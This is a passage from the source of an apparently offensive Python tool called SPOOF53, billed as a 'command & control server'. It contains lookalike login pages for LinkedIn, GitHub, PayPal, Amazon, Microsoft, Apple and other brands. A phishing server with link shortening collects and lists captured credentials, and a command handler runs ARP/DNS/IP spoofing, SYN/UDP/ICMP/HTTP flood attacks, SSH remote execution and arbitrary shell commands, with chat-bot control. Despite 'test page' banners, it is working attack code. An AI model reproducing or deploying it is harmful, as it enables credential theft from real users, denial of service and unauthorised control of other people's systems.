<style>body{font-family:-apple-system;background:#f3f2f0;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:white;border-radius:8px;padding:40px 32px;width:400px}.logo{color:#0a66c2;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #666;border-radius:4px}button{width:100%;padding:14px;background:#0a66c2;color:white;border:none;border-radius:28px}.warning{margin-top:24px;padding:12px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">LinkedIn</div><h2>Sign in</h2>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _github_template(self):
        return """<!DOCTYPE html>
<html><head><title>GitHub</title>
<style>body{font-family:-apple-system;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #d0d7de;border-radius:6px;padding:32px;width:400px}.logo{color:#24292f;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #d0d7de;border-radius:6px}button{width:100%;padding:12px;background:#2da44e;color:#fff;border:none;border-radius:6px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">GitHub</div>
<form method="POST"><input type="text" name="username" placeholder="Username or email address" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _paypal_template(self):
        return """<!DOCTYPE html>
<html><head><title>PayPal</title>
<style>body{font-family:Arial;background:#f5f5f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:40px;width:400px}.logo{color:#003087;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ccc;border-radius:4px}button{width:100%;padding:14px;background:#0070ba;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">PayPal</div>
<form method="POST"><input type="text" name="email" placeholder="Email or mobile number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _amazon_template(self):
        return """<!DOCTYPE html>
<html><head><title>Amazon</title>
<style>body{font-family:Arial;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border:1px solid #ddd;border-radius:8px;padding:32px;width:400px}.logo{color:#ff9900;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px}button{width:100%;padding:12px;background:#ff9900;color:#000;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">amazon</div>
<form method="POST"><input type="text" name="email" placeholder="Email or mobile phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _netflix_template(self):
        return """<!DOCTYPE html>
<html><head><title>Netflix</title>
<style>body{font-family:Helvetica;background:#141414;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:4px;padding:48px;width:400px}.logo{color:#e50914;font-size:40px;text-align:center}input{width:100%;padding:16px;margin:10px 0;background:#333;border:none;border-radius:4px;color:#fff}button{width:100%;padding:16px;background:#e50914;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">NETFLIX</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _spotify_template(self):
        return """<!DOCTYPE html>
<html><head><title>Spotify</title>
<style>body{font-family:Circular,Helvetica;background:#121212;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#000;border-radius:8px;padding:48px;width:400px}.logo{color:#1ed760;font-size:32px;text-align:center}input{width:100%;padding:14px;margin:10px 0;background:#3e3e3e;border:none;border-radius:40px;color:#fff}button{width:100%;padding:14px;background:#1ed760;color:#000;border:none;border-radius:40px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Spotify</div>
<form method="POST"><input type="text" name="email" placeholder="Email or username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _microsoft_template(self):
        return """<!DOCTYPE html>
<html><head><title>Microsoft</title>
<style>body{font-family:Segoe UI;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:4px;padding:48px;width:400px}.logo{color:#f25022;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:2px}button{width:100%;padding:12px;background:#0078d4;color:#fff;border:none;border-radius:2px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Microsoft</div>
<form method="POST"><input type="text" name="email" placeholder="Email, phone, or Skype" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _apple_template(self):
        return """<!DOCTYPE html>
<html><head><title>Apple ID</title>
<style>body{font-family:SF Pro Text;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:48px;width:400px}.logo{color:#000;font-size:40px;text-align:center}input{width:100%;padding:14px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:14px;background:#0071e3;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo"></div><h2>Sign in with your Apple ID</h2>
<form method="POST"><input type="text" name="email" placeholder="Apple ID" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign in</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _whatsapp_template(self):
        return """<!DOCTYPE html>
<html><head><title>WhatsApp Web</title>
<style>body{font-family:Helvetica;background:#075e54;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#25d366;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#25d366;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">WhatsApp</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _telegram_template(self):
        return """<!DOCTYPE html>
<html><head><title>Telegram Web</title>
<style>body{font-family:-apple-system;background:#2aabee;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:12px;padding:40px;width:400px}.logo{color:#2aabee;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:8px}button{width:100%;padding:12px;background:#2aabee;color:#fff;border:none;border-radius:8px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Telegram</div>
<form method="POST"><input type="text" name="username" placeholder="Phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _discord_template(self):
        return """<!DOCTYPE html>
<html><head><title>Discord</title>
<style>body{font-family:Whitney,Helvetica;background:#36393f;display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#36393f;border-radius:8px;padding:40px;width:400px}.logo{color:#fff;font-size:32px;text-align:center}input{width:100%;padding:12px;margin:10px 0;background:#202225;border:none;border-radius:4px;color:#fff}button{width:100%;padding:12px;background:#5865f2;color:#fff;border:none;border-radius:4px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Discord</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone number" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _custom_template(self):
        return """<!DOCTYPE html>
<html><head><title>Login</title>
<style>body{font-family:Arial;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);display:flex;justify-content:center;align-items:center;min-height:100vh}.login-box{background:#fff;border-radius:10px;padding:40px;width:400px}.logo{text-align:center;color:#764ba2;font-size:28px}input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}button{width:100%;padding:12px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border:none;border-radius:5px}.warning{margin-top:20px;padding:10px;background:#fff3cd;color:#856404;text-align:center}</style></head>
<body><div class="login-box"><div class="logo">Secure Login</div>
<form method="POST"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div></div></body></html>"""
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# COMMAND HANDLER
# =====================
class CommandHandler:
    """Unified command handler for all platforms"""
    
    def __init__(self, db: DatabaseManager, spoof_engine: SpoofingEngine, 
                 traffic_gen: TrafficGenerator, phishing_server: PhishingServer):
        self.db = db
        self.spoof_engine = spoof_engine
        self.traffic_gen = traffic_gen
        self.phishing_server = phishing_server
        self.ssh_clients = {}
    
    def execute_command(self, command: str, source: str = "local") -> Dict[str, Any]:
        """Execute command and return result"""
        start_time = time.time()
        
        parts = command.strip().split()
        if not parts:
            return {'success': False, 'output': 'Empty command'}
        
        cmd = parts[0].lower()
        args = parts[1:]
        
        result = self._dispatch_command(cmd, args)
        execution_time = time.time() - start_time
        
        self.db.log_command(command, source, result.get('success', False), 
                           str(result.get('output', ''))[:5000], execution_time)
        
        result['execution_time'] = execution_time
        return result
    
    def _dispatch_command(self, cmd: str, args: List[str]) -> Dict[str, Any]:
        """Dispatch command to appropriate handler"""
        
        # Nmap commands
        if cmd in ['nmap', 'scan', 'portscan']:
            return self._execute_nmap(args)
        
        # Curl commands
        elif cmd == 'curl':
            return self._execute_curl(args)
        
        # Wget commands
        elif cmd == 'wget':
            return self._execute_wget(args)
        
        # Netcat commands
        elif cmd in ['nc', 'ncat', 'netcat']:
            return self._execute_nc(args)
        
        # SSH commands
        elif cmd == 'ssh':
            return self._execute_ssh(args)
        elif cmd == 'ssh_connect':
            return self._execute_ssh_connect(args)
        elif cmd == 'ssh_exec':
            return self._execute_ssh_exec(args)
        elif cmd == 'ssh_list':
            return self._execute_ssh_list()
        elif cmd == 'ssh_disconnect':
            return self._execute_ssh_disconnect(args)
        
        # Spoofing commands
        elif cmd == 'spoof_ip':
            return self._execute_spoof_ip(args)
        elif cmd == 'spoof_mac':
            return self._execute_spoof_mac(args)
        elif cmd == 'arp_spoof':
            return self._execute_arp_spoof(args)
        elif cmd == 'dns_spoof':
            return self._execute_dns_spoof(args)
        elif cmd == 'stop_spoof':
            return self._execute_stop_spoof(args)
        
        # Traffic generation
        elif cmd in ['icmp_flood', 'ping_flood']:
            return self._execute_icmp_flood(args)
        elif cmd in ['syn_flood', 'tcp_flood']:
            return self._execute_syn_flood(args)
        elif cmd == 'udp_flood':
            return self._execute_udp_flood(args)
        elif cmd == 'http_flood':
            return self._execute_http_flood(args)
        elif cmd == 'stop_flood':
            return self._execute_stop_flood(args)
        
        # Phishing commands
        elif cmd.startswith('phish_'):
            platform = cmd.replace('phish_', '')
            return self._execute_generate_phishing(platform, args)
        elif cmd == 'phishing_start':
            return self._execute_phishing_start(args)
        elif cmd == 'phishing_stop':
            return self._execute_phishing_stop(args)
        elif cmd == 'phishing_status':
            return self._execute_phishing_status()
        elif cmd == 'phishing_creds':
            return self._execute_phishing_creds()
        
        # System commands
        elif cmd == 'ping':
            return self._execute_ping(args)
        elif cmd == 'traceroute':
            return self._execute_traceroute(args)
        elif cmd == 'dig':
            return self._execute_dig(args)
        elif cmd == 'whois':
            return self._execute_whois(args)
        elif cmd == 'history':
            return self._execute_history(args)
        elif cmd == 'threats':
            return self._execute_threats(args)
        elif cmd == 'status':
            return self._execute_status()
        elif cmd == 'help':
            return self._execute_help()
        elif cmd == 'clear':
            return {'success': True, 'output': ''}
        
        # Generic command execution
        else:
            return self._execute_generic(' '.join([cmd] + args))
    
    def _execute_nmap(self, args: List[str]) -> Dict[str, Any]:
        """Execute nmap command"""
        if not args:
            return {'success': False, 'output': 'Usage: nmap <target> [options]'}
        return CommandExecutor.execute(['nmap'] + args, timeout=300)
    
    def _execute_curl(self, args: List[str]) -> Dict[str, Any]:
        """Execute curl command"""
        if not args:
            return {'success': False, 'output': 'Usage: curl <url> [options]'}
        return CommandExecutor.execute(['curl'] + args, timeout=60)
    
    def _execute_wget(self, args: List[str]) -> Dict[str, Any]:
        """Execute wget command"""
        if not args:
            return {'success': False, 'output': 'Usage: wget <url> [options]'}
        return CommandExecutor.execute(['wget'] + args, timeout=300)
    
    def _execute_nc(self, args: List[str]) -> Dict[str, Any]:
        """Execute netcat command"""
        if not args:
            return {'success': False, 'output': 'Usage: nc <host> <port> [options]'}
        return CommandExecutor.execute(['nc'] + args, timeout=60)
    
    def _execute_ssh(self, args: List[str]) -> Dict[str, Any]:
        """Execute SSH command"""
        if not args:
            return {'success': False, 'output': 'Usage: ssh <user@host> [command]'}
        return CommandExecutor.execute(['ssh'] + args, timeout=300)
    
    def _execute_ssh_connect(self, args: List[str]) -> Dict[str, Any]:
        """Connect via SSH"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: ssh_connect <name> <host> <user> [pass]'}
        
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        
        conn_id = str(uuid.uuid4())[:8]
        
        if not PARAMIKO_AVAILABLE:
            return {'success': False, 'output': 'Paramiko not installed. Install with: pip install paramiko'}
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            if password:
                client.connect(host, username=username, password=password, timeout=10)
            else:
                client.connect(host, username=username, timeout=10)
            
            self.ssh_clients[conn_id] = client
            
            # Save to database
            self.db.save_ssh_connection(conn_id, name, host, 22, username, password)
            
            return {'success': True, 'output': f"Connected to {host} as {username} (ID: {conn_id})"}
        except Exception as e:
            return {'success': False, 'output': f"Connection failed: {e}"}
    
    def _execute_ssh_exec(self, args: List[str]) -> Dict[str, Any]:
        """Execute command via SSH"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: ssh_exec <conn_id> <command>'}
        
        conn_id, command = args[0], ' '.join(args[1:])
        
        if conn_id not in self.ssh_clients:
            return {'success': False, 'output': 'Not connected. Use ssh_connect first.'}
        
        try:
            stdin, stdout, stderr = self.ssh_clients[conn_id].exec_command(command, timeout=30)
            output = stdout.read().decode()
            error = stderr.read().decode()
            return {'success': True, 'output': output if output else error}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _execute_ssh_list(self) -> Dict[str, Any]:
        """List SSH connections"""
        if not self.ssh_clients:
            return {'success': True, 'output': 'No active SSH connections'}
        
        output = "Active SSH Connections:\n"
        for conn_id in self.ssh_clients:
            output += f"  • {conn_id}\n"
        return {'success': True, 'output': output}
    
    def _execute_ssh_disconnect(self, args: List[str]) -> Dict[str, Any]:
        """Disconnect SSH session"""
        if not args:
            for conn_id, client in self.ssh_clients.items():
                try:
                    client.close()
                except:
                    pass
            self.ssh_clients.clear()
            return {'success': True, 'output': 'Disconnected all SSH sessions'}
        
        conn_id = args[0]
        if conn_id in self.ssh_clients:
            try:
                self.ssh_clients[conn_id].close()
                del self.ssh_clients[conn_id]
                return {'success': True, 'output': f'Disconnected {conn_id}'}
            except Exception as e:
                return {'success': False, 'output': f'Failed to disconnect: {e}'}
        
        return {'success': False, 'output': f'Connection {conn_id} not found'}
    
    def _execute_spoof_ip(self, args: List[str]) -> Dict[str, Any]:
        """Spoof IP address"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: spoof_ip <original_ip> <spoofed_ip> <target> [interface]'}
        
        original = args[0]
        spoofed = args[1]
        target = args[2]
        interface = args[3] if len(args) > 3 else "eth0"
        
        return self.spoof_engine.spoof_ip(original, spoofed, target, interface)
    
    def _execute_spoof_mac(self, args: List[str]) -> Dict[str, Any]:
        """Spoof MAC address"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: spoof_mac <interface> <new_mac>'}
        
        interface = args[0]
        new_mac = args[1]
        
        return self.spoof_engine.spoof_mac(interface, new_mac)
    
    def _execute_arp_spoof(self, args: List[str]) -> Dict[str, Any]:
        """ARP spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: arp_spoof <target_ip> <spoof_ip> [interface]'}
        
        target = args[0]
        spoof_ip = args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        
        return self.spoof_engine.arp_spoof(target, spoof_ip, interface)
    
    def _execute_dns_spoof(self, args: List[str]) -> Dict[str, Any]:
        """DNS spoofing"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: dns_spoof <domain> <fake_ip> [interface]'}
        
        domain = args[0]
        fake_ip = args[1]
        interface = args[2] if len(args) > 2 else "eth0"
        
        return self.spoof_engine.dns_spoof(domain, fake_ip, interface)
    
    def _execute_stop_spoof(self, args: List[str]) -> Dict[str, Any]:
        """Stop spoofing"""
        spoof_id = args[0] if args else None
        return self.spoof_engine.stop_spoofing(spoof_id)
    
    def _execute_icmp_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate ICMP flood"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: icmp_flood <target_ip> <duration> [rate]'}
        
        target = args[0]
        duration = int(args[1])
        rate = int(args[2]) if len(args) > 2 else 100
        
        return self.traffic_gen.generate_icmp_flood(target, duration, rate)
    
    def _execute_syn_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate SYN flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: syn_flood <target_ip> <port> <duration> [rate]'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        
        return self.traffic_gen.generate_syn_flood(target, port, duration, rate)
    
    def _execute_udp_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate UDP flood"""
        if len(args) < 3:
            return {'success': False, 'output': 'Usage: udp_flood <target_ip> <port> <duration> [rate]'}
        
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        rate = int(args[3]) if len(args) > 3 else 100
        
        return self.traffic_gen.generate_udp_flood(target, port, duration, rate)
    
    def _execute_http_flood(self, args: List[str]) -> Dict[str, Any]:
        """Generate HTTP flood"""
        if len(args) < 2:
            return {'success': False, 'output': 'Usage: http_flood <target_ip> <duration> [port] [rate]'}
        
        target = args[0]
        duration = int(args[1])
        port = int(args[2]) if len(args) > 2 else 80
        rate = int(args[3]) if len(args) > 3 else 50
        
        return self.traffic_gen.generate_http_flood(target, port, duration, rate)
    
    def _execute_stop_flood(self, args: List[str]) -> Dict[str, Any]:
        """Stop flood generation"""
        generator_id = args[0] if args else None
        return {'success': self.traffic_gen.stop_generation(generator_id), 'output': 'Stopped flood generation'}
    
    def _execute_generate_phishing(self, platform: str, args: List[str]) -> Dict[str, Any]:
        """Generate phishing link"""
        link_id = str(uuid.uuid4())[:8]
        url = f"http://localhost:8080/{link_id}"
        
        self.db.save_phishing_link(link_id, platform, url)
        
        # Optionally start server
        if args and args[0] == 'start':
            port = int(args[1]) if len(args) > 1 else 8080
            self.phishing_server.start(link_id, platform, port)
            url = self.phishing_server.get_url()
        
        # Shorten URL if available
        short_url = url
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                short_url = s.tinyurl.short(url)
            except:
                pass
        
        return {
            'success': True,
            'link_id': link_id,
            'platform': platform,
            'url': url,
            'short_url': short_url,
            'command': f"phishing_start {link_id} [port]"
        }
    
    def _execute_phishing_start(self, args: List[str]) -> Dict[str, Any]:
        """Start phishing server"""
        if len(args) < 1:
            return {'success': False, 'output': 'Usage: phishing_start <link_id> [port]'}
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else 8080
        
        # Get platform from database
        self.db.cursor.execute('SELECT platform FROM phishing_links WHERE id = ?', (link_id,))
        row = self.db.cursor.fetchone()
        
        if not row:
            return {'success': False, 'output': f'Link {link_id} not found'}
        
        platform = row['platform']
        success = self.phishing_server.start(link_id, platform, port)
        
        if success:
            return {
                'success': True,
                'url': self.phishing_server.get_url(),
                'port': port,
                'message': f"Phishing server started at {self.phishing_server.get_url()}"
            }
        else:
            return {'success': False, 'output': 'Failed to start server'}
    
    def _execute_phishing_stop(self, args: List[str]) -> Dict[str, Any]:
        """Stop phishing server"""
        self.phishing_server.stop()
        return {'success': True, 'output': 'Phishing server stopped'}
    
    def _execute_phishing_status(self) -> Dict[str, Any]:
        """Get phishing server status"""
        return {
            'success': True,
            'running': self.phishing_server.running,
            'url': self.phishing_server.get_url() if self.phishing_server.running else None,
            'link_id': self.phishing_server.link_id
        }
    
    def _execute_phishing_creds(self) -> Dict[str, Any]:
        """Get captured credentials"""
        self.db.cursor.execute('''
            SELECT * FROM captured_credentials ORDER BY timestamp DESC LIMIT 20
        ''')
        rows = self.db.cursor.fetchall()
        
        if not rows:
            return {'success': True, 'output': 'No captured credentials yet'}
        
        output = "🎣 CAPTURED CREDENTIALS:\n" + "-" * 50 + "\n"
        for row in rows:
            output += f"[{row['timestamp'][:19]}] {row['username']}:{row['password']} from {row['ip_address']}\n"
        
        return {'success': True, 'output': output}
    
    def _execute_ping(self, args: List[str]) -> Dict[str, Any]:
        """Ping command"""
        if not args:
            return {'success': False, 'output': 'Usage: ping <target>'}
        
        count = '4'
        if len(args) > 1 and args[1].isdigit():
            count = args[1]
        
        return CommandExecutor.execute(['ping', '-c', count, args[0]], timeout=10)
    
    def _execute_traceroute(self, args: List[str]) -> Dict[str, Any]:
        """Traceroute command"""
        if not args:
            return {'success': False, 'output': 'Usage: traceroute <target>'}
        
        if shutil.which('traceroute'):
            return CommandExecutor.execute(['traceroute', '-n', args[0]], timeout=60)
        elif shutil.which('tracert'):
            return CommandExecutor.execute(['tracert', args[0]], timeout=60)
        else:
            return {'success': False, 'output': 'No traceroute tool found'}
    
    def _execute_dig(self, args: List[str]) -> Dict[str, Any]:
        """DNS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: dig <domain> [record_type]'}
        
        record_type = args[1] if len(args) > 1 else 'A'
        return CommandExecutor.execute(['dig', args[0], record_type, '+short'], timeout=10)
    
    def _execute_whois(self, args: List[str]) -> Dict[str, Any]:
        """WHOIS lookup"""
        if not args:
            return {'success': False, 'output': 'Usage: whois <domain>'}
        
        if WHOIS_AVAILABLE:
            try:
                result = whois.whois(args[0])
                return {'success': True, 'output': str(result)}
            except Exception as e:
                return {'success': False, 'output': str(e)}
        else:
            return CommandExecutor.execute(['whois', args[0]], timeout=30)
    
    def _execute_history(self, args: List[str]) -> Dict[str, Any]:
        """Get command history"""
        limit = int(args[0]) if args else 20
        history = self.db.get_command_history(limit)
        
        if not history:
            return {'success': True, 'output': 'No command history'}
        
        output = "📜 Command History:\n" + "-" * 50 + "\n"
        for i, cmd in enumerate(history[:limit], 1):
            status = "✅" if cmd['success'] else "❌"
            output += f"{i:2d}. {status} [{cmd['timestamp'][:19]}] {cmd['command'][:50]}\n"
        
        return {'success': True, 'output': output}
    
    def _execute_threats(self, args: List[str]) -> Dict[str, Any]:
        """Get recent threats"""
        limit = int(args[0]) if args else 20
        threats = self.db.get_threats(limit)
        
        if not threats:
            return {'success': True, 'output': 'No threats detected'}
        
        output = "🚨 Threat Log:\n" + "-" * 50 + "\n"
        for threat in threats:
            severity_icon = "🔴" if threat['severity'] == 'high' else "🟡" if threat['severity'] == 'medium' else "🟢"
            output += f"{severity_icon} [{threat['timestamp'][:19]}] {threat['threat_type']}\n"
            if threat.get('source_ip'):
                output += f"   Source: {threat['source_ip']}\n"
        
        return {'success': True, 'output': output}
    
    def _execute_status(self) -> Dict[str, Any]:
        """Get system status"""
        stats = self.db.get_statistics()
        
        output = f"""
🕶️ SPOOF53 - System Status
{'='*50}

📊 Statistics:
  • Total Commands: {stats.get('total_commands', 0)}
  • Total Scans: {stats.get('total_scans', 0)}
  • Total Threats: {stats.get('total_threats', 0)}
  • Phishing Links: {stats.get('phishing_links', 0)}
  • Captured Credentials: {stats.get('captured_credentials', 0)}
  • SSH Connections: {stats.get('ssh_connections', 0)}
  • Traffic Tests: {stats.get('traffic_tests', 0)}
  • Spoofing Attempts: {stats.get('spoofing_attempts', 0)}

🔄 Active Services:
  • Phishing Server: {'✅ Running' if self.phishing_server.running else '❌ Stopped'}
  • Spoofing Processes: {len(self.spoof_engine.running_spoofs)}
  • Traffic Generators: {len(self.traffic_gen.active_generators)}
  • SSH Sessions: {len(self.ssh_clients)}

💻 System:
  • Platform: {platform.system()} {platform.release()}
  • Python: {platform.python_version()}
  • Scapy: {'✅' if SCAPY_AVAILABLE else '❌'}

🤖 Bot Status:
  • Discord: {'✅' if DISCORD_AVAILABLE else '❌'}
  • Telegram: {'✅' if TELETHON_AVAILABLE else '❌'}
  • WhatsApp: {'✅' if SELENIUM_AVAILABLE else '❌'}
  • Slack: {'✅' if SLACK_AVAILABLE else '❌'}
  • Signal: {'✅' if SIGNAL_CLI_AVAILABLE else '❌'}
"""
        return {'success': True, 'output': output}
    
    def _execute_help(self) -> Dict[str, Any]:
        """Get help"""
        help_text = f"""
{Colors.BOLD}🕶️ SPOOF53 - Unified Command & Control Server{Colors.RESET}
{Colors.DIM}Version: 1.0.0 | 5000+ Security Commands{Colors.RESET}

{Colors.CYAN}🔍 NETWORK SCANNING:{Colors.RESET}
  nmap [options] <target>      - Full Nmap scanning
  scan <target>                 - Quick port scan (1-1000)
  ping <target>                 - ICMP echo test
  traceroute <target>           - Network path tracing
  dig <domain> [type]           - DNS lookup
  whois <domain>                - WHOIS information

{Colors.MAGENTA}🎭 ADVANCED NETWORK SPOOFING:{Colors.RESET}
  spoof_ip <orig> <spoof> <target> [iface] - IP spoofing
  spoof_mac <iface> <mac>      - MAC address spoofing
  arp_spoof <target> <spoof_ip> [iface]   - ARP spoofing (MITM)
  dns_spoof <domain> <ip> [iface]         - DNS spoofing
  stop_spoof [id]              - Stop spoofing

{Colors.RED}💥 FLOOD ATTACKS (Authorized Testing Only):{Colors.RESET}
  icmp_flood <ip> <duration> [rate]   - ICMP flood
  syn_flood <ip> <port> <duration> [rate] - SYN flood
  udp_flood <ip> <port> <duration> [rate] - UDP flood
  http_flood <ip> <duration> [port] [rate] - HTTP flood
  stop_flood [id]              - Stop floods

{Colors.GREEN}🎣 PHISHING & SOCIAL ENGINEERING:{Colors.RESET}
  phish_<platform> [start] [port]  - Generate phishing link
    Platforms: facebook, instagram, twitter, gmail, linkedin, 
               github, paypal, amazon, netflix, spotify, 
               microsoft, apple, whatsapp, telegram, discord
  phishing_start <link_id> [port]  - Start phishing server
  phishing_stop                - Stop phishing server
  phishing_status              - Check server status
  phishing_creds               - View captured credentials

{Colors.BLUE}🔐 SSH REMOTE ACCESS:{Colors.RESET}
  ssh_connect <name> <host> <user> [pass] - Connect
  ssh_exec <conn_id> <command> - Execute command
  ssh_list                     - List active connections
  ssh_disconnect [conn_id]     - Disconnect

{Colors.YELLOW}📡 DATA TRANSFER:{Colors.RESET}
  curl [options] <url>         - HTTP requests
  wget [options] <url>         - File download
  nc [options] <host> <port>   - Netcat connections

{Colors.WHITE}📊 SYSTEM COMMANDS:{Colors.RESET}
  history [limit]              - View command history
  threats [limit]              - View threat log
  status                       - System status
  clear                        - Clear screen
  help                         - This help menu

{Colors.DIM}Examples:
  nmap -sS -p 80,443 192.168.1.1
  spoof_ip 192.168.1.100 10.0.0.1 192.168.1.1
  arp_spoof 192.168.1.1 192.168.1.100
  icmp_flood 192.168.1.1 30 500
  phish_facebook start 8080
  ssh_connect myserver 192.168.1.100 root password123
  ssh_exec myserver "ls -la"
  curl -X GET https://api.github.com
  whois google.com{Colors.RESET}
"""
        return {'success': True, 'output': help_text}
    
    def _execute_generic(self, command: str) -> Dict[str, Any]:
        """Execute generic shell command"""
        return CommandExecutor.execute(command, shell=True, timeout=60)

# =====================
# DISCORD BOT
# =====================
class DiscordBot:
    """Discord bot integration"""
    
    def __init__(self, handler: CommandHandler, db: DatabaseManager):
        self.handler = handler
        self.db = db
        self.bot = None
        self.running = False
        self.config = {}
    
    def load_config(self):
        """Load Discord configuration"""
        config_file = os.path.join(CONFIG_DIR, "discord.json")
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
        except Exception as e:
            logger.error(f"Failed to load Discord config: {e}")
    
    def save_config(self, token: str, prefix: str = "!"):
        """Save Discord configuration"""
        self.config = {
            "token": token,
